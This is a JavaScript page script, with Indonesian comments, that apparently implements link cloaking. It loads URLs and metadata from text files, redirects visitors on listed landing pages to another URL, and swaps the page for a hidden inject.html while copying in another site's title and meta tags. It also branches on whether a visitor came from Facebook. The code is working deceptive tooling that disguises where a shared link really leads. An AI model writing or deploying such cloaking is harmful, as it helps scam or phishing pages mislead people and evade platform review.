(function () {
  const referrer = document.referrer; // Mendapatkan referer
  const userAgent = navigator.userAgent; // Mendapatkan user-agent
  const isFacebookCrawler = /facebookexternalhit|facebook/i.test(userAgent); // Deteksi crawler Facebook
  const currentPath = location.pathname; // Mendapatkan path URL saat ini
  const testing = true; // Flag untuk pengujian

  // Fungsi untuk membaca file eksternal
  const fetchFileContent = async (filePath) => {
    const response = await fetch(filePath);
    if (!response.ok) {
      throw new Error(`Failed to fetch ${filePath}`);
    }
    return response.text();
  };

  // Fungsi untuk menyisipkan metadata asli ke dalam DOM
  const injectMetadata = (metadata) => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(metadata, 'text/html');

    // Sisipkan <title>
    const title = doc.querySelector('title');
    if (title) {
      document.title = title.textContent;
    }

    // Sisipkan <meta> dan <link>
    const head = document.head;
    doc.querySelectorAll('meta, link').forEach((meta) => {
      head.appendChild(meta.cloneNode(true));
    });
  };

  // Membaca URL dari google.txt, target.txt, metadata dari target.txt, dan daftar halaman dari landingpage.txt
  Promise.all([
    fetchFileContent('/google.txt'),
    fetchFileContent('/target.txt'),
    fetchFileContent('/target.txt'), // Ambil metadata asli dari target.txt
    fetchFileContent('/landingpage.txt'), // Ambil daftar halaman dari landingpage.txt
  ])
    .then(([googleUrl, targetUrl, originalHtml, landingPages]) => {
      const landingPageList = landingPages.split('\n').map((page) => page.trim()); // Buat daftar halaman

      if (landingPageList.some((page) => currentPath.includes(page))) {
        // Jika currentPath cocok dengan salah satu halaman di landingpage.txt
        injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
        location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
      } else if (currentPath.includes(targetUrl.trim()) && (!referrer.includes('facebook.com') || testing)) {
        // GitHub Pages optimized approach for loading inject.html
        const loadInjectHTML = async () => {
          try {
            // Get the repository name from the URL for GitHub Pages path resolution
            const pathSegments = window.location.pathname.split('/');
            const repoName = pathSegments[1] === '' ? '' : '/' + pathSegments[1];
            
            // Construct the primary path for GitHub Pages
            const injectPath = `${window.location.origin}${repoName}/inject.html?nocache=${Date.now()}`;
            console.log('Attempting to fetch from:', injectPath);

            // Fetch the inject.html content
            const response = await fetch(injectPath, {
              method: 'GET',
              headers: {
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
              },
            });

            if (!response.ok) {
              throw new Error(`Failed to fetch inject.html: ${response.status}`);
            }

            const html = await response.text();
            if (!html || html.trim() === '') {
              throw new Error('Fetched inject.html is empty');
            }

            console.log('Inject HTML successfully loaded');
            processHTML(html);
          } catch (error) {
            console.error('Error loading inject.html:', error.message);
            tryAlternativePath();
          }
        };

        // Try alternative path if the first attempt fails
        const tryAlternativePath = async () => {
          try {
            console.log('Trying alternative path for inject.html');
            const fallbackPath = `./inject.html?nocache=${Date.now()}`;
            const response = await fetch(fallbackPath, {
              method: 'GET',
              headers: {
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
              },
            });

            if (!response.ok) {
              throw new Error(`Failed to fetch inject.html from fallback path: ${response.status}`);
            }

            const html = await response.text();
            if (!html || html.trim() === '') {
              throw new Error('Fetched inject.html from fallback path is empty');
            }

            console.log('Inject HTML loaded from alternative path');
            processHTML(html);
          } catch (error) {
            console.error('All attempts to load inject.html failed:', error.message);
            alert('Failed to load content. Please check your connection.');
          }
        };

        // Process the HTML content once loaded
        const processHTML = (html) => {
          try {
            // Replace document content
            document.open();
            document.write(html);
            document.close();

            // Inject metadata after DOM replacement
            setTimeout(() => {
              injectMetadata(originalHtml);
              console.log('Metadata injection complete');
            }, 200); // Slight delay for slower browsers
          } catch (e) {
            console.error('Error processing HTML:', e);
          }
        };

        // Start the loading process
        loadInjectHTML();
      }
    })
    .catch((err) => console.error('Error loading URLs:', err));
})();